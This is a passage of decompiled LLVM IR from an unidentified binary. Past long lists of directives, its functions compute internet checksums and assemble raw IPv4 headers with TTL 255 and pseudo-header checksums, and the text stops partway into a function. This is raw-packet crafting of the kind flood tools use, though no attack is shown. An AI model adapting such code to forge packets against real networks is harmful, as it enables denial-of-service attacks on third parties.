  uselistorder i8* @global_var_2c8aa.53, { 249, 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c8a9.52, { 249, 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e55c, { 1, 0 }
  uselistorder label %dec_label_pc_e528, { 1, 0 }
  uselistorder label %dec_label_pc_e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_e4c0, { 1, 0 }
  uselistorder label %dec_label_pc_e48c, { 1, 0 }
  uselistorder label %dec_label_pc_e458, { 1, 0 }
  uselistorder label %dec_label_pc_e424, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3bc, { 1, 0 }
  uselistorder label %dec_label_pc_e388, { 1, 0 }
  uselistorder label %dec_label_pc_e354, { 1, 0 }
  uselistorder label %dec_label_pc_e320, { 1, 0 }
  uselistorder label %dec_label_pc_e2ec, { 1, 0 }
  uselistorder label %dec_label_pc_e2b8, { 1, 0 }
  uselistorder label %dec_label_pc_e284, { 1, 0 }
  uselistorder label %dec_label_pc_e250, { 1, 0 }
  uselistorder label %dec_label_pc_e21c, { 1, 0 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %dec_label_pc_e1b4, { 1, 0 }
  uselistorder label %dec_label_pc_e180, { 1, 0 }
  uselistorder label %dec_label_pc_e14c, { 1, 0 }
  uselistorder label %dec_label_pc_e118, { 1, 0 }
  uselistorder label %dec_label_pc_df50, { 1, 0 }
  uselistorder label %dec_label_pc_df1c, { 1, 0 }
  uselistorder label %dec_label_pc_dee8, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %dec_label_pc_de80, { 1, 0 }
  uselistorder label %dec_label_pc_de4c, { 1, 0 }
  uselistorder label %dec_label_pc_de18, { 1, 0 }
  uselistorder label %dec_label_pc_dde4, { 1, 0 }
  uselistorder label %dec_label_pc_ddb0, { 1, 0 }
  uselistorder label %dec_label_pc_dd7c, { 1, 0 }
  uselistorder label %dec_label_pc_dd48, { 1, 0 }
  uselistorder label %dec_label_pc_dd14, { 1, 0 }
  uselistorder label %dec_label_pc_dce0, { 1, 0 }
  uselistorder label %dec_label_pc_dcac, { 1, 0 }
  uselistorder label %dec_label_pc_dc78, { 1, 0 }
  uselistorder label %dec_label_pc_dc44, { 1, 0 }
  uselistorder label %dec_label_pc_dc10, { 1, 0 }
  uselistorder label %dec_label_pc_dbdc, { 1, 0 }
  uselistorder label %dec_label_pc_dba8, { 1, 0 }
  uselistorder label %dec_label_pc_db74, { 1, 0 }
  uselistorder label %dec_label_pc_db40, { 1, 0 }
  uselistorder label %dec_label_pc_db0c, { 1, 0 }
  uselistorder label %dec_label_pc_dad8, { 1, 0 }
  uselistorder label %dec_label_pc_daa4, { 1, 0 }
  uselistorder label %dec_label_pc_da70, { 1, 0 }
  uselistorder label %dec_label_pc_da3c, { 1, 0 }
  uselistorder label %dec_label_pc_da08, { 1, 0 }
  uselistorder label %dec_label_pc_d9d4, { 1, 0 }
  uselistorder label %dec_label_pc_d9a0, { 1, 0 }
  uselistorder label %dec_label_pc_d96c, { 1, 0 }
  uselistorder label %dec_label_pc_d938, { 1, 0 }
  uselistorder label %dec_label_pc_d904, { 1, 0 }
  uselistorder label %dec_label_pc_d8d0, { 1, 0 }
  uselistorder label %dec_label_pc_d89c, { 1, 0 }
  uselistorder label %dec_label_pc_d868, { 1, 0 }
  uselistorder label %dec_label_pc_d834, { 1, 0 }
  uselistorder label %dec_label_pc_d800, { 1, 0 }
  uselistorder label %dec_label_pc_d7cc, { 1, 0 }
  uselistorder label %dec_label_pc_d798, { 1, 0 }
  uselistorder label %dec_label_pc_d764, { 1, 0 }
  uselistorder label %dec_label_pc_d730, { 1, 0 }
  uselistorder label %dec_label_pc_d6fc, { 1, 0 }
  uselistorder label %dec_label_pc_d6c8, { 1, 0 }
  uselistorder label %dec_label_pc_d694, { 1, 0 }
  uselistorder label %dec_label_pc_d660, { 1, 0 }
  uselistorder label %dec_label_pc_d62c, { 1, 0 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
  uselistorder label %dec_label_pc_d5c4, { 1, 0 }
  uselistorder label %dec_label_pc_d590, { 1, 0 }
  uselistorder label %dec_label_pc_d55c, { 1, 0 }
  uselistorder label %dec_label_pc_d528, { 1, 0 }
  uselistorder label %dec_label_pc_d4f4, { 1, 0 }
  uselistorder label %dec_label_pc_d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_d48c, { 1, 0 }
  uselistorder label %dec_label_pc_d458, { 1, 0 }
  uselistorder label %dec_label_pc_d424, { 1, 0 }
  uselistorder label %dec_label_pc_d3f0, { 1, 0 }
  uselistorder label %dec_label_pc_d3bc, { 1, 0 }
  uselistorder label %dec_label_pc_d388, { 1, 0 }
  uselistorder label %dec_label_pc_d354, { 1, 0 }
  uselistorder label %dec_label_pc_d320, { 1, 0 }
  uselistorder label %dec_label_pc_d2ec, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
  uselistorder label %dec_label_pc_d284, { 1, 0 }
  uselistorder label %dec_label_pc_d250, { 1, 0 }
  uselistorder label %dec_label_pc_d21c, { 1, 0 }
  uselistorder label %dec_label_pc_d1e8, { 1, 0 }
  uselistorder label %dec_label_pc_d1b4, { 1, 0 }
  uselistorder label %dec_label_pc_d180, { 1, 0 }
  uselistorder label %dec_label_pc_d14c, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d0e4, { 1, 0 }
  uselistorder label %dec_label_pc_d0b0, { 1, 0 }
  uselistorder label %dec_label_pc_d07c, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_d014, { 1, 0 }
  uselistorder label %dec_label_pc_cfe0, { 1, 0 }
  uselistorder label %dec_label_pc_cfac, { 1, 0 }
  uselistorder label %dec_label_pc_cf78, { 1, 0 }
  uselistorder label %dec_label_pc_cf44, { 1, 0 }
  uselistorder label %dec_label_pc_cf10, { 1, 0 }
  uselistorder label %dec_label_pc_cedc, { 1, 0 }
  uselistorder label %dec_label_pc_cea8, { 1, 0 }
  uselistorder label %dec_label_pc_ce74, { 1, 0 }
  uselistorder label %dec_label_pc_ce40, { 1, 0 }
  uselistorder label %dec_label_pc_ce0c, { 1, 0 }
  uselistorder label %dec_label_pc_cdd8, { 1, 0 }
  uselistorder label %dec_label_pc_cda4, { 1, 0 }
  uselistorder label %dec_label_pc_cd70, { 1, 0 }
  uselistorder label %dec_label_pc_cd3c, { 1, 0 }
  uselistorder label %dec_label_pc_cd08, { 1, 0 }
  uselistorder label %dec_label_pc_ccd4, { 1, 0 }
  uselistorder label %dec_label_pc_cca0, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c, { 1, 0 }
  uselistorder label %dec_label_pc_cc38, { 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 1, 0 }
  uselistorder label %dec_label_pc_cbd0, { 1, 0 }
  uselistorder label %dec_label_pc_cb9c, { 1, 0 }
  uselistorder label %dec_label_pc_cb68, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 1, 0 }
  uselistorder label %dec_label_pc_cb00, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_ca98, { 1, 0 }
  uselistorder label %dec_label_pc_ca64, { 1, 0 }
  uselistorder label %dec_label_pc_ca30, { 1, 0 }
  uselistorder label %dec_label_pc_c9fc, { 1, 0 }
  uselistorder label %dec_label_pc_c9c8, { 1, 0 }
  uselistorder label %dec_label_pc_c994, { 1, 0 }
  uselistorder label %dec_label_pc_c960, { 1, 0 }
  uselistorder label %dec_label_pc_c92c, { 1, 0 }
  uselistorder label %dec_label_pc_c8f8, { 1, 0 }
  uselistorder label %dec_label_pc_c8c4, { 1, 0 }
  uselistorder label %dec_label_pc_c890, { 1, 0 }
  uselistorder label %dec_label_pc_c85c, { 1, 0 }
  uselistorder label %dec_label_pc_c828, { 1, 0 }
  uselistorder label %dec_label_pc_c7f4, { 1, 0 }
  uselistorder label %dec_label_pc_c7c0, { 1, 0 }
  uselistorder label %dec_label_pc_c78c, { 1, 0 }
  uselistorder label %dec_label_pc_c758, { 1, 0 }
  uselistorder label %dec_label_pc_c724, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 1, 0 }
  uselistorder label %dec_label_pc_c6bc, { 1, 0 }
  uselistorder label %dec_label_pc_c688, { 1, 0 }
  uselistorder label %dec_label_pc_c654, { 1, 0 }
  uselistorder label %dec_label_pc_c620, { 1, 0 }
  uselistorder label %dec_label_pc_c5ec, { 1, 0 }
  uselistorder label %dec_label_pc_c5b8, { 1, 0 }
  uselistorder label %dec_label_pc_c584, { 1, 0 }
  uselistorder label %dec_label_pc_c550, { 1, 0 }
  uselistorder label %dec_label_pc_c51c, { 1, 0 }
  uselistorder label %dec_label_pc_c4e8, { 1, 0 }
  uselistorder label %dec_label_pc_c4b4, { 1, 0 }
  uselistorder label %dec_label_pc_c480, { 1, 0 }
  uselistorder label %dec_label_pc_c44c, { 1, 0 }
  uselistorder label %dec_label_pc_c418, { 1, 0 }
  uselistorder label %dec_label_pc_c3e4, { 1, 0 }
  uselistorder label %dec_label_pc_c3b0, { 1, 0 }
  uselistorder label %dec_label_pc_c37c, { 1, 0 }
  uselistorder label %dec_label_pc_c348, { 1, 0 }
  uselistorder label %dec_label_pc_c314, { 1, 0 }
  uselistorder label %dec_label_pc_c2e0, { 1, 0 }
  uselistorder label %dec_label_pc_c2ac, { 1, 0 }
  uselistorder label %dec_label_pc_c278, { 1, 0 }
  uselistorder label %dec_label_pc_c244, { 1, 0 }
  uselistorder label %dec_label_pc_c210, { 1, 0 }
  uselistorder label %dec_label_pc_c1dc, { 1, 0 }
  uselistorder label %dec_label_pc_c1a8, { 1, 0 }
  uselistorder label %dec_label_pc_c174, { 1, 0 }
  uselistorder label %dec_label_pc_c140, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 1, 0 }
  uselistorder label %dec_label_pc_c0d8, { 1, 0 }
  uselistorder label %dec_label_pc_c0a4, { 1, 0 }
  uselistorder label %dec_label_pc_c070, { 1, 0 }
  uselistorder label %dec_label_pc_c03c, { 1, 0 }
  uselistorder label %dec_label_pc_c008, { 1, 0 }
  uselistorder label %dec_label_pc_bfd4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_bd04, { 1, 0 }
  uselistorder label %dec_label_pc_bcd0, { 1, 0 }
  uselistorder label %dec_label_pc_bc9c, { 1, 0 }
  uselistorder label %dec_label_pc_bc68, { 1, 0 }
  uselistorder label %dec_label_pc_bc34, { 1, 0 }
  uselistorder label %dec_label_pc_bc00, { 1, 0 }
  uselistorder label %dec_label_pc_bbcc, { 1, 0 }
  uselistorder label %dec_label_pc_bb98, { 1, 0 }
  uselistorder label %dec_label_pc_bb64, { 1, 0 }
  uselistorder label %dec_label_pc_bb30, { 1, 0 }
  uselistorder label %dec_label_pc_bafc, { 1, 0 }
  uselistorder label %dec_label_pc_bac8, { 1, 0 }
  uselistorder label %dec_label_pc_ba94, { 1, 0 }
  uselistorder label %dec_label_pc_ba60, { 1, 0 }
  uselistorder label %dec_label_pc_ba2c, { 1, 0 }
  uselistorder label %dec_label_pc_b9f8, { 1, 0 }
  uselistorder label %dec_label_pc_b9c4, { 1, 0 }
  uselistorder label %dec_label_pc_b990, { 1, 0 }
  uselistorder label %dec_label_pc_b95c, { 1, 0 }
  uselistorder label %dec_label_pc_b928, { 1, 0 }
  uselistorder label %dec_label_pc_b8f4, { 1, 0 }
  uselistorder label %dec_label_pc_b8c0, { 1, 0 }
  uselistorder label %dec_label_pc_b88c, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b824, { 1, 0 }
  uselistorder label %dec_label_pc_b7f0, { 1, 0 }
  uselistorder label %dec_label_pc_b7bc, { 1, 0 }
  uselistorder label %dec_label_pc_b788, { 1, 0 }
  uselistorder label %dec_label_pc_b754, { 1, 0 }
  uselistorder label %dec_label_pc_b720, { 1, 0 }
  uselistorder label %dec_label_pc_b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_b6b8, { 1, 0 }
  uselistorder label %dec_label_pc_b684, { 1, 0 }
  uselistorder label %dec_label_pc_b650, { 1, 0 }
  uselistorder label %dec_label_pc_b61c, { 1, 0 }
  uselistorder label %dec_label_pc_b5e8, { 1, 0 }
  uselistorder label %dec_label_pc_b5b4, { 1, 0 }
  uselistorder label %dec_label_pc_b580, { 1, 0 }
  uselistorder label %dec_label_pc_b54c, { 1, 0 }
  uselistorder label %dec_label_pc_b518, { 1, 0 }
  uselistorder label %dec_label_pc_b4e4, { 1, 0 }
  uselistorder label %dec_label_pc_b4b0, { 1, 0 }
  uselistorder label %dec_label_pc_b47c, { 1, 0 }
  uselistorder label %dec_label_pc_b448, { 1, 0 }
  uselistorder label %dec_label_pc_b414, { 1, 0 }
  uselistorder label %dec_label_pc_b3e0, { 1, 0 }
  uselistorder label %dec_label_pc_b3ac, { 1, 0 }
  uselistorder label %dec_label_pc_b378, { 1, 0 }
  uselistorder label %dec_label_pc_b344, { 1, 0 }
  uselistorder label %dec_label_pc_b310, { 1, 0 }
  uselistorder label %dec_label_pc_b2dc, { 1, 0 }
  uselistorder label %dec_label_pc_b2a8, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 1, 0 }
  uselistorder label %dec_label_pc_b240, { 1, 0 }
  uselistorder label %dec_label_pc_b20c, { 1, 0 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %dec_label_pc_b1a4, { 1, 0 }
  uselistorder label %dec_label_pc_b170, { 1, 0 }
  uselistorder label %dec_label_pc_b13c, { 1, 0 }
  uselistorder label %dec_label_pc_b108, { 1, 0 }
  uselistorder label %dec_label_pc_b0d4, { 1, 0 }
  uselistorder label %dec_label_pc_b0a0, { 1, 0 }
  uselistorder label %dec_label_pc_b06c, { 1, 0 }
  uselistorder label %dec_label_pc_b038, { 1, 0 }
  uselistorder label %dec_label_pc_b004, { 1, 0 }
  uselistorder label %dec_label_pc_afd0, { 1, 0 }
  uselistorder label %dec_label_pc_af9c, { 1, 0 }
  uselistorder label %dec_label_pc_af68, { 1, 0 }
  uselistorder label %dec_label_pc_af34, { 1, 0 }
}

define i32 @function_e57c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e57c:
  %v3_e580 = load i32, i32* @fp, align 4
  %v2_e594 = load i32, i32* @global_var_32aec.554, align 4
  %v1_e59c = call i32 @function_1468c(i32 %v2_e594)
  %v2_e5a8 = and i32 %v1_e59c, %arg1
  %v0_e5b0 = call i32 @function_83f0()
  %v1_e5bc = sub i32 -1, %arg1
  %v2_e5c0 = and i32 %v0_e5b0, %v1_e5bc
  %v2_e5c8 = xor i32 %v2_e5c0, %v2_e5a8
  store i32 %v3_e580, i32* @fp, align 4
  ret i32 %v2_e5c8
}

define i32 @function_e5e0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e5e0:
  %v8_e6549 = icmp sgt i32 %arg2, 1
  br i1 %v8_e6549, label %dec_label_pc_e60c, label %dec_label_pc_e658

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e5e0, %dec_label_pc_e60c
  %v2_e620 = phi i32 [ %v2_e624, %dec_label_pc_e60c ], [ 0, %dec_label_pc_e5e0 ]
  %stack_var_-44.012 = phi i32 [ %v5_e628, %dec_label_pc_e60c ], [ 0, %dec_label_pc_e5e0 ]
  %stack_var_-40.011 = phi i32 [ %v1_e644, %dec_label_pc_e60c ], [ %arg2, %dec_label_pc_e5e0 ]
  %stack_var_-36.010 = phi i16* [ %v5_e63c, %dec_label_pc_e60c ], [ %arg1, %dec_label_pc_e5e0 ]
  %v4_e60c = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_e610 = load i16, i16* %stack_var_-36.010, align 2
  %v3_e610 = zext i16 %v2_e610 to i32
  %v2_e624 = add i32 %v3_e610, %v2_e620
  %v3_e624 = icmp ult i32 %v2_e624, %v2_e620
  %v4_e628 = zext i1 %v3_e624 to i32
  %v5_e628 = add i32 %v4_e628, %stack_var_-44.012
  %v1_e638 = add i32 %v4_e60c, 2
  %v5_e63c = inttoptr i32 %v1_e638 to i16*
  %v1_e644 = add nsw i32 %stack_var_-40.011, -2
  %v8_e654 = icmp sgt i32 %v1_e644, 1
  br i1 %v8_e654, label %dec_label_pc_e60c, label %dec_label_pc_e64c.dec_label_pc_e658_crit_edge

dec_label_pc_e64c.dec_label_pc_e658_crit_edge:    ; preds = %dec_label_pc_e60c
  br label %dec_label_pc_e658

dec_label_pc_e658:                                ; preds = %dec_label_pc_e64c.dec_label_pc_e658_crit_edge, %dec_label_pc_e5e0
  %v2_e678 = phi i32 [ %v2_e624, %dec_label_pc_e64c.dec_label_pc_e658_crit_edge ], [ 0, %dec_label_pc_e5e0 ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_e63c, %dec_label_pc_e64c.dec_label_pc_e658_crit_edge ], [ %arg1, %dec_label_pc_e5e0 ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_e628, %dec_label_pc_e64c.dec_label_pc_e658_crit_edge ], [ 0, %dec_label_pc_e5e0 ]
  %v7_e650.lcssa.in = phi i32 [ %v1_e644, %dec_label_pc_e64c.dec_label_pc_e658_crit_edge ], [ %arg2, %dec_label_pc_e5e0 ]
  %v7_e650.lcssa = icmp eq i32 %v7_e650.lcssa.in, 1
  br i1 %v7_e650.lcssa, label %dec_label_pc_e664, label %dec_label_pc_e6e0.preheader

dec_label_pc_e664:                                ; preds = %dec_label_pc_e658
  %v1_e668 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_e668 = load i8, i8* %v1_e668, align 1
  %v3_e668 = zext i8 %v2_e668 to i32
  %v2_e67c = add i32 %v3_e668, %v2_e678
  %v3_e67c = icmp ult i32 %v2_e67c, %v2_e678
  %v4_e680 = zext i1 %v3_e67c to i32
  %v5_e680 = add i32 %v4_e680, %stack_var_-44.0.lcssa
  br label %dec_label_pc_e6e0.preheader

dec_label_pc_e6e0.preheader:                      ; preds = %dec_label_pc_e664, %dec_label_pc_e658
  %v3_e70c.ph = phi i32 [ %v2_e678, %dec_label_pc_e658 ], [ %v2_e67c, %dec_label_pc_e664 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_e658 ], [ %v5_e680, %dec_label_pc_e664 ]
  %v3_e6e437 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_e6ec38 = udiv i32 %v3_e70c.ph, 65536
  %v2_e6f039 = or i32 %v3_e6e437, %v3_e6ec38
  %v3_e6f840 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_e70041 = or i32 %v2_e6f039, %v3_e6f840
  %v2_e70442 = icmp eq i32 %v2_e70041, 0
  br i1 %v2_e70442, label %dec_label_pc_e70c, label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e6e0.preheader, %dec_label_pc_e690
  %v3_e6f845 = phi i32 [ %v3_e6f8, %dec_label_pc_e690 ], [ %v3_e6f840, %dec_label_pc_e6e0.preheader ]
  %v2_e6f044 = phi i32 [ %v2_e6f0, %dec_label_pc_e690 ], [ %v2_e6f039, %dec_label_pc_e6e0.preheader ]
  %v3_e70c43 = phi i32 [ %v2_e6d0, %dec_label_pc_e690 ], [ %v3_e70c.ph, %dec_label_pc_e6e0.preheader ]
  %v2_e6a4 = urem i32 %v3_e70c43, 65536
  %v2_e6d0 = add i32 %v2_e6f044, %v2_e6a4
  %v3_e6d0 = icmp ult i32 %v2_e6d0, %v2_e6a4
  %v4_e6d4 = zext i1 %v3_e6d0 to i32
  %v5_e6d4 = add nuw nsw i32 %v4_e6d4, %v3_e6f845
  %v3_e6e4 = mul i32 %v5_e6d4, 65536
  %v3_e6ec = udiv i32 %v2_e6d0, 65536
  %v2_e6f0 = or i32 %v3_e6e4, %v3_e6ec
  %v3_e6f8 = udiv i32 %v5_e6d4, 65536
  %v2_e700 = or i32 %v2_e6f0, %v3_e6f8
  %v2_e704 = icmp eq i32 %v2_e700, 0
  br i1 %v2_e704, label %dec_label_pc_e6e0.dec_label_pc_e70c_crit_edge, label %dec_label_pc_e690

dec_label_pc_e6e0.dec_label_pc_e70c_crit_edge:    ; preds = %dec_label_pc_e690
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e6e0.dec_label_pc_e70c_crit_edge, %dec_label_pc_e6e0.preheader
  %v3_e70c.lcssa = phi i32 [ %v2_e6d0, %dec_label_pc_e6e0.dec_label_pc_e70c_crit_edge ], [ %v3_e70c.ph, %dec_label_pc_e6e0.preheader ]
  %v1_e718 = urem i32 %v3_e70c.lcssa, 65536
  %v3_e720 = xor i32 %v1_e718, 65535
  ret i32 %v3_e720

; uselistorder directives
  uselistorder i32 %v2_e6f0, { 1, 0 }
  uselistorder i32 %v5_e6d4, { 1, 0 }
  uselistorder i32 %v2_e6d0, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e6f840, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_e70c.ph, { 2, 1, 0 }
  uselistorder i32 %v2_e678, { 0, 2, 1 }
  uselistorder i32 %v1_e644, { 0, 2, 1 }
  uselistorder i32 %v2_e624, { 0, 2, 1 }
  uselistorder i32 %v2_e620, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
  uselistorder label %dec_label_pc_e60c, { 1, 0 }
}

define i32 @function_e734(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e734:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e738 = load i32, i32* @fp, align 4
  store i32 59200, i32* %stack_var_-4, align 4
  %v2_e73c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e73c, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_e75c = add i32 %arg1, 12
  %v2_e75c = inttoptr i32 %v1_e75c to i32*
  %v3_e75c = load i32, i32* %v2_e75c, align 4
  store i32 %v3_e75c, i32* %stack_var_-44, align 4
  %v1_e784 = call i32 @function_1464c(i32 20)
  %v1_e7a0 = call i32 @function_14ccc(i32 32)
  %v2_e7ac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e7ac, i32* @r3, align 4
  store i32 %v1_e7a0, i32* @r0, align 4
  store i32 %v2_e7ac, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_e7bc = call i32 @function_14000()
  %v1_e7c4 = add i32 %v1_e7a0, 12
  store i32 %v1_e7c4, i32* @r3, align 4
  store i32 %v1_e7c4, i32* @r0, align 4
  %v3_e7cc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_e7cc, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_e7d4 = call i32 @function_14000()
  %v2_e7e0 = inttoptr i32 %v1_e7a0 to i16*
  %v3_e7e0 = call i32 @function_e5e0(i16* %v2_e7e0, i32 32)
  %sext = mul i32 %v3_e7e0, 65536
  %v1_e7e4 = sdiv i32 %sext, 65536
  store i32 %v1_e7a0, i32* @r0, align 4
  %v0_e7f0 = call i32 @function_15850()
  %v4_e7f4 = urem i32 %v1_e7e4, 65536
  store i32 %v3_e738, i32* @fp, align 4
  ret i32 %v4_e7f4

; uselistorder directives
  uselistorder i32 %v1_e7a0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @function_e808(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e808:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_e80c = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_e878 = add i32 %tmp3, 1
  %v4_e878 = inttoptr i32 %v3_e878 to i8*
  store i8 0, i8* %v4_e878, align 1
  %v3_e87c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_e87c, 20
  %v1_e898 = trunc i32 %fold to i16
  %v3_e898 = add i32 %tmp3, 2
  %v4_e898 = inttoptr i32 %v3_e898 to i16*
  store i16 %v1_e898, i16* %v4_e898, align 2
  %v0_e89c = call i32 @function_83f0()
  %v1_e8b0 = trunc i32 %v0_e89c to i16
  %v3_e8b0 = add i32 %tmp3, 4
  %v4_e8b0 = inttoptr i32 %v3_e8b0 to i16*
  store i16 %v1_e8b0, i16* %v4_e8b0, align 2
  %v3_e8bc = add i32 %tmp3, 6
  %v4_e8bc = inttoptr i32 %v3_e8bc to i16*
  store i16 0, i16* %v4_e8bc, align 2
  %v3_e8c8 = add i32 %tmp3, 8
  %v4_e8c8 = inttoptr i32 %v3_e8c8 to i8*
  store i8 -1, i8* %v4_e8c8, align 1
  %v3_e8d4 = add i32 %tmp3, 9
  %v4_e8d4 = inttoptr i32 %v3_e8d4 to i8*
  store i8 %tmp, i8* %v4_e8d4, align 1
  %v3_e8e0 = add i32 %tmp3, 10
  %v4_e8e0 = inttoptr i32 %v3_e8e0 to i16*
  store i16 0, i16* %v4_e8e0, align 2
  %v2_e8ec = add i32 %tmp3, 12
  %v3_e8ec = inttoptr i32 %v2_e8ec to i32*
  store i32 %arg3, i32* %v3_e8ec, align 4
  %v2_e8f8 = add i32 %tmp3, 16
  %v3_e8f8 = inttoptr i32 %v2_e8f8 to i32*
  store i32 %arg2, i32* %v3_e8f8, align 4
  store i32 %v3_e80c, i32* @fp, align 4
  ret i32 %v0_e89c

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 0, 4 }
}

define i32 @function_e908(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e908:
  %v8_e924 = icmp sgt i32 %arg1, 2
  br i1 %v8_e924, label %dec_label_pc_e934, label %dec_label_pc_e944

dec_label_pc_e934:                                ; preds = %dec_label_pc_e908
  %v1_e938 = call i32 @function_12a98(i32 %arg1)
  br label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %dec_label_pc_e908, %dec_label_pc_e934
  %storemerge1 = phi i32 [ 0, %dec_label_pc_e934 ], [ 1, %dec_label_pc_e908 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_e944, { 1, 0 }
}

define i32 @function_e958(i32 %arg1) local_unnamed_addr {
dec_label_pc_e958:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
